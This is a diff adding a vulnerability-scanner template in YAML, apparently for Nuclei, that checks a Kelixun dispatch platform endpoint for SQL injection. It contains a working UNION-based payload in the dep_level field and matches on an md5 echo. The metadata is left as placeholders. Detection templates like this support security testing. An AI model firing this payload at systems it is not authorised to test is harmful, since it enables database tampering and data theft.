@@ -1,0 +1,22 @@
+id: klx-ajax_users-sqli
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 福建科立迅通信指挥调度平台某接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /app/ext/ajax_users.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dep_level=1')+UNION+ALL+SELECT+NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL--+-
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e10adc3949ba59abbe56e057f20f883e'
